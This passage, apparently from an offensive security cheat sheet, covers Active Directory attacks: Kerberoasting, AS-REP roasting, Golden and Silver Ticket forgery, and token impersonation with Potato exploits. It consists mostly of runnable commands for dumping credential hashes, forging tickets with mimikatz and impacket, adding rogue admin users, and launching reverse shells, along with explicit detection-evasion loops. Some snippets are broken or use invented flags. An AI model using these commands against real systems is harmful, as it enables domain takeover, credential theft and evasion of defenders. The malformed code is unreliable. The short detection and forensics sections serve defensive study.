+**Offline TGS Cracking**
+
+Crack extracted tickets to recover service account passwords:
+
+```bash
+# Using Hashcat
+hashcat -m 13100 hashes.txt wordlist.txt
+hashcat -m 13100 hashes.txt wordlist.txt --show
+
+# Using John the Ripper
+john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
+john --format=krb5tgs hashes.txt --show
+
+# GPU acceleration (Hashcat)
+hashcat -m 13100 hashes.txt wordlist.txt -d 1 --workload-profile 4
+```
+
+[Inference] Kerberoasting cracking success depends on service account password strength and wordlist coverage, with common service account passwords (default credentials, inherited patterns) typically cracked quickly compared to interactive user passwords.
+
+**Silver Ticket Creation from Cracked Passwords**
+
+Use recovered passwords to create forged service tickets:
+
+```bash
+# Obtain service account hash from recovered password
+echo -n "password" | iconv -f UTF-8 -t UTF-16LE | md5sum
+
+# Create Silver Ticket with recovered password hash
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:<ServiceHash> /ticket:silver.kirbi
+```
+
+[Inference] Silver Tickets created from recovered service account passwords enable persistent access to specific services without requiring additional credential theft or exploitation.
+
+**Kerberoasting Detection and Evasion**
+
+Identify Kerberoasting activity through logging:
+
+```
+Event ID 4769 (Kerberos Service Ticket Requested) with unusual patterns
+Multiple service ticket requests for different SPNs from single user
+Service ticket requests outside normal service access patterns
+```
+
+Evade detection through:
+
+```bash
+# Request service tickets during normal business hours
+# Spread ticket requests across multiple legitimate users
+# Request only commonly accessed services
+# Use existing legitimate user sessions for ticket requests
+
+# Legitimate workflow
+impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request --dc-ip <DC-IP>
+```
+
+[Inference] Kerberoasting evasion exploits log analysis limitations where service ticket requests appear legitimate to event parsing systems, though behavioral analysis detecting rapid multi-SPN enumeration may identify suspicious activity patterns.
+
+**Custom Kerberoasting Tools**
+
+Develop targeted Kerberoasting implementations:
+
+```bash
+# Using impacket-GetUserSPNs with filtering
+impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request | grep -i "sql\|mssql\|http\|cifs" > high-value-spns.txt
+
+# Custom Python exploitation
+python3 << 'EOF'
+from impacket.krb5.kerberosv5 import getKerberosTGS
+from impacket import hashes
+
+# Request TGS for specific SPNs
+spn_list = ["cifs/server.domain.local", "mssql/db.domain.local"]
+for spn in spn_list:
+    tgs = getKerberosTGS(spn, user, password, domain)
+    print(f"Extracted TGS for {spn}")
+EOF
+```
+
+[Unverified] Custom implementations enable targeted Kerberoasting focusing on high-value service accounts or specific SPNs while potentially avoiding standard detection signatures.
+
+**Kerberoasting with Unconstrained Delegation**
+
+Exploit unconstrained delegation for enhanced Kerberoasting:
+
+```bash
+# Identify systems with unconstrained delegation
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "userAccountControl:1.2.840.113556.1.4.803:=524288" sAMAccountName
+
+# Compromise unconstrained delegation system
+# Extract cached admin TGT
+mimikatz # sekurlsa::tickets /export
+
+# Use admin TGT for Kerberoasting across domain
+impacket-GetUserSPNs DOMAIN.LOCAL/Administrator -use-kcache -request
+```
+
+[Inference] Unconstrained delegation systems cache high-privilege TGTs enabling Kerberoasting under administrative context, potentially accessing restricted SPNs unavailable to standard users.
+
+**Kerberoasting with Constrained Delegation**
+
+Exploit S4U2Proxy for service delegation impersonation:
+
+```bash
+# Identify services with constrained delegation
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "msDS-AllowedToDelegateTo=*" sAMAccountName
+
+# Create S4U2 ticket for delegation target
+impacket-getST -spn cifs/server DOMAIN/serviceaccount:password@<DC> -impersonate Administrator
+
+# Use impersonated ticket for lateral movement
+export KRB5CCNAME=./Administrator.ccache
+```
+
+[Inference] Constrained delegation exploitation enables impersonation of specific accounts for targeted services, potentially enabling privilege escalation when delegation is misconfigured to include administrative services.
+
+**Kerberoasting Large Scale Enumeration**
+
+Perform comprehensive SPN enumeration and ticket extraction:
+
+```bash
+# Extract all SPNs from domain
+impacket-GetUserSPNs DOMAIN.LOCAL/user:password -all -request -outputfile all_hashes.txt
+
+# Parallel processing for efficiency
+cat all_hashes.txt | parallel --pipe --block 10M 'hashcat -m 13100 - wordlist.txt'
+
+# Statistics on extracted tickets
+grep -o "krb5tgs" all_hashes.txt | wc -l
+```
+
+[Inference] Large-scale Kerberoasting targeting entire domain SPN inventories enables identification of weak service account passwords across infrastructure, though [Unverified] mass ticket extraction may trigger detection systems monitoring unusual ticket request volumes.
+
+---
+
+## AS-REP Roasting
+
+AS-REP Roasting attacks extract pre-authentication hashes from user accounts configured with pre-authentication disabled, enabling offline password cracking without requiring Kerberos TGTs.
+
+**Pre-Authentication Disabled Accounts Discovery**
+
+Identify accounts vulnerable to AS-REP Roasting:
+
+```bash
+# Query LDAP for disabled pre-authentication
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
+
+# Using GetNPUsers.py (Impacket)
+impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt
+
+# Query specific users
+impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/user:password
+
+# Enumerate via SMB
+enum4linux -U <DC> | grep "Pre-Auth"
+```
+
+[Inference] Users with pre-authentication disabled (UserAccountControl flag 0x400000) skip the KDC pre-authentication step, enabling attackers to request authentication responses without providing credentials for offline cracking.
+
+**AS-REP Hash Extraction**
+
+Extract authentication response hashes:
+
+```bash
+# Using GetNPUsers.py
+impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt -format john
+
+# Output format for cracking tools
+cat hashes.txt
+# $krb5asrep$23$user@DOMAIN.LOCAL:$[hash_material]
+
+# Query without credentials
+impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/ -usersfile userlist.txt -no-pass
+```
+
+AS-REP response format analysis:
+
+```
+$krb5asrep$[encryption_type]$[user]@[domain]:[response_hash]
+Encryption types: 23 (RC4), 17 (AES128), 18 (AES256)
+```
+
+[Inference] AS-REP hashes contain encryption material from user passwords, enabling offline brute-force attacks through repeated hashing and comparison against known plaintext structures in legitimate Kerberos responses.
+
+**Offline AS-REP Hash Cracking**
+
+Crack extracted hashes to recover user passwords:
+
+```bash
+# Using Hashcat
+hashcat -m 18200 hashes.txt wordlist.txt
+hashcat -m 18200 hashes.txt wordlist.txt --show
+
+# Using John the Ripper
+john --format=krb5asrep hashes.txt --wordlist=wordlist.txt
+john --format=krb5asrep hashes.txt --show
+
+# GPU acceleration
+hashcat -m 18200 hashes.txt wordlist.txt -d 1 --workload-profile 4
+```
+
+[Inference] AS-REP cracking success rates typically exceed Kerberoasting due to user account passwords being generally weaker than service account passwords and less likely to have complexity enforcement.
+
+**Pre-Authentication Disabled Account Discovery at Scale**
+
+Enumerate vulnerable accounts across entire domain:
+
+```bash
+# Mass enumeration
+impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile /dev/stdin << 'EOF' -format john
+user1
+user2
+user3
+EOF
+
+# Domain-wide enumeration (requires valid credentials)
+impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/admin:password | tee asrep_hashes.txt
+
+# Query via custom script
+python3 << 'EOF'
+from ldap3 import Server, Connection
+server = Server('ldap://<DC>')
+conn = Connection(server,conn = Connection(server, user='DOMAIN\user', password='password') 
+conn.bind() 
+conn.search('dc=DOMAIN,dc=LOCAL', '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=['sAMAccountName']) 
+
+for entry in conn.entries: 
+	print(entry.sAMAccountName.value) EOF
+````
+
+[Inference] Domain-wide AS-REP enumeration reveals configuration weaknesses where administrative accounts or service accounts have pre-authentication disabled, increasing password cracking attack surface.
+
+**AS-REP Roasting with User Enumeration**
+
+Combine AS-REP attacks with user enumeration:
+
+```bash
+# Generate user list from RID cycling
+impacket-lookupsid DOMAIN.LOCAL/user:password@<DC> | grep "User:" > userlist.txt
+
+# Extract AS-REP hashes for enumerated users
+impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt -format john -outputfile asrep_hashes.txt
+
+# Combine with Kerberoasting for comprehensive credential attack
+impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request -outputfile spn_hashes.txt
+````
+
+[Inference] Combined enumeration and extraction attacks identify both AS-REP vulnerable accounts and Kerberoastable service accounts, maximizing offline cracking opportunities.
+
+**Custom AS-REP Exploitation Tools**
+
+Develop targeted AS-REP implementations:
+
+```bash
+# Custom extraction without Impacket
+python3 << 'EOF'
+from impacket.krb5.kerberosv5 import sendReceive
+from impacket.krb5 import constants
+
+# Request AS-REP for user without pre-auth
+username = "targetuser"
+domain = "DOMAIN.LOCAL"
+kdc_ip = "<DC-IP>"
+
+# Build AS-REQ without pre-authentication
+# Process response to extract hash material
+EOF
+
+# Alternative using direct KDC queries
+nc -u <DC-IP> 88 < as_req_packet.bin > as_rep_response.bin
+```
+
+[Unverified] Custom implementations enable targeted AS-REP attacks focusing on specific user accounts or organizational units while potentially avoiding standard detection signatures.
+
+**AS-REP Detection and Evasion**
+
+Identify AS-REP Roasting activity through logging:
+
+```
+Event ID 4768 (Kerberos Authentication Ticket Requested) with encryption type mismatch
+Multiple AS-REQ requests for users with pre-authentication disabled
+KRBTGT response generation for disabled pre-auth users
+```
+
+Evade detection through:
+
+```bash
+# Query during off-hours to blend with legitimate activity
+# Space out user enumeration over extended periods
+# Use legitimate user credentials for queries
+# Combine with other credential attacks to obscure intent
+
+# Timing distribution
+for user in $(cat userlist.txt); do
+    impacket-GetNPUsers DOMAIN.LOCAL/$user -no-pass -format john
+    sleep $((RANDOM % 60 + 30))  # 30-90 second delays
+done
+```
+
+[Inference] AS-REP evasion exploits event log analysis limitations where pre-authentication requests appear legitimate when distributed across extended timeframes, though [Unverified] behavioral detection systems may identify unusual per-user query patterns.
+
+**AS-REP Roasting with Encrypted Traffic Analysis**
+
+Exploit weak encryption algorithms in AS-REP responses:
+
+```bash
+# Capture Kerberos traffic
+tcpdump -i eth0 -w kerberos.pcap "udp port 88"
+
+# Extract AS-REP responses
+tshark -r kerberos.pcap -Y "kerberos.msg_type == 11" -T json > as_rep_packets.json
+
+# Analyze encryption types
+jq '.[] | select(.kerberos) | .kerberos | .enc_part.etype' as_rep_packets.json
+```
+
+[Unverified] Weak encryption algorithms in AS-REP responses (RC4/type 23) enable [Inference] faster offline cracking compared to AES encryption, though modern Windows defaults prefer AES encryption when available.
+
+**AS-REP Password Spraying Integration**
+
+Combine AS-REP attacks with password spray for initial compromise:
+
+```bash
+# Password spray against AS-REP vulnerable accounts
+impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt -format john &
+
+# Parallel password spray
+for password in "Winter2024!" "Password123" "Company2024"; do
+    impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/ -usersfile userlist.txt -format john -passwords "$password"
+done
+```
+
+[Inference] Integrated attacks combine information gathering (AS-REP vulnerable account identification) with credential attacks (password spraying or hash cracking), maximizing initial compromise probability.
+
+**AS-REP with Machine Account Abuse**
+
+Exploit machine accounts with pre-authentication disabled:
+
+```bash
+# Identify computer accounts with disabled pre-auth
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
+
+# Extract AS-REP for machine account
+impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile computer_accounts.txt -format john
+
+# Crack machine account hash (typically predictable)
+hashcat -m 18200 machine_hashes.txt wordlist.txt
+```
+
+[Inference] Machine account AS-REP exploitation enables lateral movement when machine account passwords are predictable or discoverable through other means.
+
+---
+
+## Golden Ticket Attacks
+
+Golden Ticket attacks forge domain-wide Kerberos Ticket-Granting Tickets (TGTs) using the Krbtgt account password hash, enabling persistent administrative access to any domain resource regardless of subsequent password changes.
+
+**Krbtgt Hash Extraction**
+
+Extract Krbtgt password hash from domain controller:
+
+```bash
+# Using secretsdump on domain controller
+impacket-secretsdump -dc-ip <DC-IP> DOMAIN.LOCAL/admin:password@<DC>
+
+# Extract from SAM/SYSTEM hives
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+# Extract via VSS (Volume Shadow Copy)
+impacket-secretsdump -use-vss DOMAIN.LOCAL/admin:password@<DC>
+
+# NTDS.DIT extraction
+esentutl /y /vss
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+```
+
+Krbtgt account identification:
+
+```bash
+# Locate Krbtgt in domain
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "sAMAccountName=krbtgt" objectSid
+
+# Query via RID (typically RID 502)
+impacket-lookupsid DOMAIN.LOCAL/user:password@<DC> | grep "RID 502"
+```
+
+[Inference] Krbtgt hash extraction requires domain controller administrative access or volume shadow copy access, representing a critical security boundary where compromise enables persistent domain-wide persistence.
+
+**Golden Ticket Creation**
+
+Forge domain-wide TGTs using Krbtgt hash:
+
+```bash
+# Using Mimikatz
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:golden.kirbi
+
+# Alternative syntax with specific parameters
+mimikatz # kerberos::golden /user:FakeAdmin /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:golden.kirbi /startoffset:0 /endin:600 /renewmax:10080
+
+# Using impacket-ticketer
+impacket-ticketer -nthash <KrbtgtHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator golden.ccache
+```
+
+Golden Ticket parameters:
+
+```
+/user: Forged username (arbitrary, typically Administrator)
+/domain: Domain name (FQDN or NetBIOS)
+/sid: Domain SID (S-1-5-21-X-X-X)
+/krbtgt: Krbtgt account NTLM hash
+/ticket: Output ticket filename
+/startoffset: Offset from current time (negative = past)
+/endin: Ticket lifetime in minutes (default 600)
+/renewmax: Renewal window in minutes (default 10080)
+```
+
+[Inference] Golden Ticket creation requires only Krbtgt hash and domain parameters—no KDC interaction occurs, enabling offline ticket generation and use on completely isolated networks.
+
+**Domain SID Extraction**
+
+Obtain Domain SID for Golden Ticket creation:
+
+```bash
+# Query via LDAP
+ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "(objectClass=domain)" objectSid
+
+# Using impacket-lookupsid
+impacket-lookupsid DOMAIN.LOCAL/user:password@<DC>
+
+# Query via RPC
+rpcclient -U "DOMAIN\user%password" <DC> -c "querydispinfo"
+
+# From compromise system registry
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DomainName
+```
+
+SID format validation:
+
+```bash
+# Verify SID format
+echo "S-1-5-21-1234567890-1234567890-1234567890" | grep -E "S-1-5-21-[0-9]+-[0-9]+-[0-9]+$"
+```
+
+[Inference] Domain SID availability through LDAP queries without authentication makes SID extraction trivial even in hardened environments.
+
+**Golden Ticket Injection and Use**
+
+Inject forged tickets for domain access:
+
+```bash
+# Inject ticket (Windows)
+mimikatz # kerberos::ptt golden.kirbi
+klist
+
+# Inject ticket (Linux)
+export KRB5CCNAME=/tmp/golden.ccache
+kinit -c /tmp/golden.ccache --keytab=golden.ccache Administrator@DOMAIN.LOCAL
+
+# Verify injection
+klist -c /tmp/golden.ccache
+```
+
+Access domain resources with injected ticket:
+
+```bash
+# SMB share access
+smbclient //<SERVER>/c$ --use-kerberos=required -k
+
+# Remote command execution via WinRM
+crackmapexec winrm <target> -u Administrator --use-kcache
+
+# LDAP queries
+ldapsearch -H ldap://<DC> -Y GSS-SPNEGO -b "dc=DOMAIN,dc=LOCAL"
+```
+
+[Inference] Injected Golden Tickets function identically to legitimate domain tickets, enabling seamless access to all domain resources where Kerberos authentication is accepted.
+
+**Persistence via Golden Tickets**
+
+Establish persistent domain access:
+
+```bash
+# Create Golden Ticket with extended lifetime
+mimikatz # kerberos::golden /user:HiddenAdmin /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:persistence.kirbi /endin:35791394 /renewmax:35791394
+
+# Export ticket for repeated use
+# Copy persistence.kirbi to offline storage or schedule re-injection
+
+# Automated re-injection via scheduled task
+# Task runs: mimikatz kerberos::ptt persistence.kirbi
+```
+
+[Unverified] Golden Ticket persistence remains valid as long as the Krbtgt hash remains unchanged, providing [Inference] persistent domain access independent of password changes or account disablement, though [Unverified] specific persistence duration depends on Kerberos policy configuration and ticket renewal limits.
+
+**Golden Ticket Detection and Mitigation**
+
+Identify Golden Ticket usage through logging:
+
+```
+Event ID 4768 (Kerberos TGT Requested) with unusual user/computer combinations
+Event ID 4769 (Kerberos Service Ticket Requested) from unexpected sources
+TGTs with impossible logon paths (user logged in from multiple locations simultaneously)
+Forged user accounts in TGT (non-existent users accessing resources)
+```
+
+Evade detection through:
+
+```bash
+# Use legitimate domain user accounts
+# Inject tickets during normal business hours
+# Distribute ticket usage across multiple systems
+# Use realistic user-to-resource access patterns
+
+# Timing distribution
+for i in {1..100}; do
+    mimikatz # kerberos::ptt golden.kirbi
+    crackmapexec smb <target-range> -u HiddenAdmin --use-kcache --continue-on-success
+    sleep $((RANDOM % 3600 + 1800))  # 30-90 minute delays
+done
+```
+
+[Inference] Golden Ticket evasion exploits detection limitations where legitimate Kerberos events show ticket usage but distinguishing forged tickets from authentic ones requires behavioral analysis and cross-resource correlation.
+
+**Krbtgt Password Change Implications**
+
+Understand Krbtgt rotation impact on Golden Tickets:
+
+```bash
+# Krbtgt password change invalidates all Golden Tickets
+# Domain requires new Krbtgt hash for ticket forgery
+
+# However, Krbtgt has two password hashes during rotation:
+# - Previous hash (old tickets remain valid temporarily)
+# - Current hash (new tickets use current)
+
+# Extract both hashes
+impacket-secretsdump -dc-ip <DC-IP> DOMAIN.LOCAL/admin:password@<DC> | grep krbtgt
+
+# Create Golden Tickets with both hashes for continuity
+mimikatz # kerberos::golden /krbtgt:<OldHash> /ticket:golden_old.kirbi
+mimikatz # kerberos::golden /krbtgt:<CurrentHash> /ticket:golden_new.kirbi
+```
+
+[Inference] Krbtgt rotation policies requiring regular password changes limit Golden Ticket persistence, though attackers with repeated domain controller access can maintain persistence through continuous Krbtgt hash extraction and ticket regeneration.
+
+**Silver vs. Golden Ticket Comparison**
+
+Distinguish ticket types for exploitation:
+
+```
+Golden Ticket: Forged TGT signed by Krbtgt
+- Access: Any domain resource
+- Requires: Krbtgt hash, domain SID
+- Creation: Offline, no KDC interaction
+- Detection: Difficult (legitimate-appearing tickets)
+- Scope: Domain-wide
+
+Silver Ticket: Forged service ticket signed by service account
+- Access: Specific service only
+- Requires: Service account hash
+- Creation: Offline, per-service
+- Detection: Service-specific log analysis
+- Scope: Single service/server
+```
+
+[Inference] Golden Tickets provide broader persistence and access compared to Silver Tickets, making them preferable for sustained compromise when Krbtgt hash is available.
+
+**Golden Ticket with Constrained Delegation**
+
+Exploit delegation for cross-service access:
+
+```bash
+# Create Golden Ticket for service account with delegation
+mimikatz # kerberos::golden /user:ServiceAccount /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:delegation.kirbi
+
+# Service account TGT enables S4U2Proxy delegation
+# Request service tickets for delegated targets
+impacket-getST -use-kcache -spn cifs/server.domain.local
+```
+
+[Inference] Golden Tickets combined with constrained delegation enable impersonation of arbitrary users for services configured in delegation ACLs, providing privilege escalation paths beyond direct ticket usage.
+
+**Golden Ticket Forensic Identification**
+
+Detect Golden Ticket artifacts during incident response:
+
+```bash
+# Check injected tickets
+klist
+
+# Examine Kerberos cache files
+file /tmp/krb5cc_*
+ls -la /tmp/krb5cc_*
+
+# Check event logs for impossible scenarios
+wevtutil qe Security /q:"Event[System[(EventID=4768)]] and Event[EventData[Data[@Name='TargetUserName']='HiddenAdmin']]"
+
+# Search for ticket files (Mimikatz .kirbi exports)
+find / -name "*.kirbi" 2>/dev/null
+```
+
+[Inference] Golden Ticket forensics focus on behavioral anomalies rather than ticket authenticity verification, as forged tickets cryptographically appear legitimate to domain systems.
+
+**Alternative Golden Ticket Creation Methods**
+
+Generate tickets through alternative mechanisms:
+
+```bash
+# Using custom Python
+python3 << 'EOF'
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import *
+# Construct TGT structure
+# Sign with Krbtgt hash
+# Export as .kirbi or .ccache
+EOF
+
+# Using rubeus (C# tool)
+Rubeus.exe golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<Hash> /ticket:golden.kirbi
+
+# Using impacket with custom parameters
+impacket-ticketer -nthash <KrbtgtHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator -extra-sid S-1-5-21-1234567890-1234567890-1234567890-519 golden.ccache
+```
+
+[Unverified] Alternative ticket creation methods enable circumvention of specific tool-based detection, though underlying Kerberos ticket structure remains identical regardless of creation method.
+
+**Golden Ticket with PAC Modification**
+
+Inject privilege information into forged tickets:
+
+```bash
+# Golden Ticket with elevated PAC (Privilege Attribute Certificate)
+mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:elevated.kirbi /groups:513,512,520,518,519
+
+# Groups: 513=Domain Users, 512=Domain Admins, 520=Group Policy Admins, 518=Schema Admins, 519=Enterprise Admins
+
+# PAC enables service-side privilege evaluation
+# Injected group membership appears in service authorization checks
+```
+
+[Inference] PAC modification enables elevation of forged ticket privileges for administrative access, though specific privilege elevation depends on service-side PAC validation and authorization policies.
+
+---
+
+## Silver Ticket Attacks
+
+### Concept Overview
+
+Silver Ticket attacks involve forging Kerberos TGS (Ticket Granting Service) tickets using a service account's NTLM hash. Unlike Golden Tickets (which use the krbtgt hash), Silver Tickets target specific services and generate less suspicious activity.
+
+### Prerequisites
+
+- Service account NTLM hash (from secretsdump, Kerberoasting, or hashdump)
+- Domain SID
+- Target service SPN (Service Principal Name)
+- Valid username to impersonate
+
+### Extracting Required Information
+
+**Obtain Domain SID**
+
+```bash
+# From Linux with Impacket
+lookupsid.py domain.local/username:password@<DC-IP>
+
+# From compromised Windows host
+powershell -c "Get-ADDomain | Select-Object DomainSID"
+whoami /user  # User SID, remove last RID for domain SID
+
+# Using CrackMapExec
+crackmapexec ldap <DC-IP> -u username -p password -M get-desc-users
+```
+
+**Obtain Service Account Hash**
+
+```bash
+# Kerberoasting to get service account hash
+GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP> -request
+
+# Crack the hash
+hashcat -m 13100 spn_hash.txt wordlist.txt
+
+# Or from secretsdump
+secretsdump.py domain.local/username:password@<target>
+```
+
+### Generating Silver Tickets
+
+**Using Impacket ticketer.py**
+
+```bash
+# Basic silver ticket for CIFS service
+ticketer.py -nthash <service_ntlm_hash> -domain-sid <domain_SID> -domain domain.local -spn cifs/target.domain.local <username>
+
+# For specific services
+# CIFS (file access)
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator
+
+# HTTP (web services)
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn http/target.domain.local Administrator
+
+# MSSQL
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator
+
+# LDAP (directory queries)
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn ldap/dc.domain.local Administrator
+
+# With additional options
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local \
+    -user-id 500 -groups 512,513,518,519,520 Administrator
+```
+
+**Common Group IDs**
+
+- 512: Domain Admins
+- 513: Domain Users
+- 518: Schema Admins
+- 519: Enterprise Admins
+- 520: Group Policy Creator Owners
+
+### Using Silver Tickets
+
+**Export Ticket on Linux**
+
+```bash
+# Set environment variable
+export KRB5CCNAME=/path/to/Administrator.ccache
+
+# Verify ticket
+klist
+
+# Use with Impacket tools
+psexec.py -k -no-pass domain.local/Administrator@target.domain.local
+smbexec.py -k -no-pass domain.local/Administrator@target.domain.local
+wmiexec.py -k -no-pass domain.local/Administrator@target.domain.local
+secretsdump.py -k -no-pass domain.local/Administrator@target.domain.local
+```
+
+**Ticket Injection on Windows (Mimikatz)**
+
+```powershell
+# Generate silver ticket with Mimikatz
+kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:target.domain.local /service:cifs /rc4:<service_ntlm_hash> /ptt
+
+# Verify injection
+klist
+
+# Access resource
+dir \\target.domain.local\c$
+```
+
+**Using Rubeus**
+
+```powershell
+# Create and inject silver ticket
+Rubeus.exe silver /service:cifs/target.domain.local /rc4:<hash> /sid:<domain_SID> /user:Administrator /ptt
+
+# Create ticket file
+Rubeus.exe silver /service:cifs/target.domain.local /rc4:<hash> /sid:<domain_SID> /user:Administrator /outfile:ticket.kirbi
+
+# Import existing ticket
+Rubeus.exe ptt /ticket:ticket.kirbi
+```
+
+### Service-Specific Silver Tickets
+
+**CIFS/SMB Service**
+
+```bash
+# Generate
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator
+
+# Use
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass domain.local/Administrator@target.domain.local
+```
+
+**HOST Service (PSExec, WMI, Scheduled Tasks)**
+
+```bash
+# Generate
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn host/target.domain.local Administrator
+
+# Use
+psexec.py -k -no-pass domain.local/Administrator@target.domain.local
+```
+
+**MSSQL Service**
+
+```bash
+# Generate
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator
+
+# Use
+mssqlclient.py -k -no-pass domain.local/Administrator@target.domain.local
+```
+
+**WinRM/HTTP Service**
+
+```bash
+# Generate
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn http/target.domain.local Administrator
+
+# Use with evil-winrm
+evil-winrm -i target.domain.local -r domain.local
+```
+
+### Detection Evasion Considerations
+
+**[Inference]** Silver tickets may avoid detection better than Golden tickets because:
+
+- They don't require DC compromise
+- They target specific services rather than domain-wide access
+- They generate fewer authentication events
+- Lifetime can be limited to reduce exposure window
+
+**Customization for Stealth**
+
+```bash
+# Specify realistic ticket lifetime (default is 10 years - suspicious)
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local \
+    -spn cifs/target.domain.local -duration 720 Administrator  # 30 days
+
+# Match existing user attributes
+ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local \
+    -spn cifs/target.domain.local -user-id <RID> -groups <group_RIDs> username
+```
+
+---
+
+## Token Impersonation
+
+### Windows Access Token Overview
+
+Windows access tokens contain security context information including user identity, group memberships, and privileges. Token impersonation allows processes to execute with different security contexts.
+
+### Token Types
+
+- **Primary Token**: Represents process security context
+- **Impersonation Token**: Temporary token for thread-level impersonation
+    - SecurityAnonymous: No impersonation
+    - SecurityIdentification: Query only
+    - SecurityImpersonation: Impersonate on local system
+    - SecurityDelegation: Impersonate across network
+
+### Privilege Requirements
+
+**SeImpersonatePrivilege**
+
+```powershell
+# Check current privileges
+whoami /priv
+
+# Common accounts with SeImpersonate
+# - IIS AppPool accounts
+# - SQL Server service accounts
+# - Local Service / Network Service
+```
+
+### Token Enumeration
+
+**Using Incognito (Metasploit/Meterpreter)**
+
+```bash
+# From Meterpreter session
+meterpreter > load incognito
+meterpreter > list_tokens -u  # List user tokens
+meterpreter > list_tokens -g  # List group tokens
+
+# Impersonate token
+meterpreter > impersonate_token "DOMAIN\\Administrator"
+
+# Verify
+meterpreter > getuid
+```
+
+**PowerShell Token Enumeration**
+
+```powershell
+# Using PowerView
+Get-Process | Select-Object Name,Id | ForEach-Object {
+    $proc = Get-Process -Id $_.Id -ErrorAction SilentlyContinue
+    if($proc) {
+        $token = $proc.Handle
+        # Additional token inspection code
+    }
+}
+```
+
+### Potato Exploits (Local Privilege Escalation)
+
+**JuicyPotato** (Windows Server 2016, Windows 10 1809+)
+
+```powershell
+# Basic usage
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\output.txt" -t *
+
+# With CLSID
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker P@ssw0rd /add" -t * -c {CLSID}
+
+# Common CLSIDs for different Windows versions
+# Windows 10 Enterprise: {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+# Windows Server 2019: {90EE9BB9-7957-4DC1-9E6E-2C0A5F1A64E4}
+
+# Reverse shell
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -nop -w hidden -e <base64_payload>" -t * -c {CLSID}
+```
+
+**RoguePotato** (Windows 10 1809+, Server 2019+)
+
+```powershell
+# Setup listener on attacking machine
+socat tcp-listen:135,reuseaddr,fork tcp:<target_IP>:9999
+
+# Execute on target
+RoguePotato.exe -r <attacker_IP> -e "cmd.exe /c whoami" -l 9999
+```
+
+**PrintSpoofer** (Universal - works on latest Windows)
+
+```powershell
+# Interactive shell
+PrintSpoofer.exe -i -c cmd
+
+# Execute specific command
+PrintSpoofer.exe -c "whoami"
+
+# Reverse shell
+PrintSpoofer.exe -c "powershell -nop -w hidden -e <base64_payload>"
+```
+
+**GodPotato** (Windows Server 2012 - Server 2022)
+
+```powershell
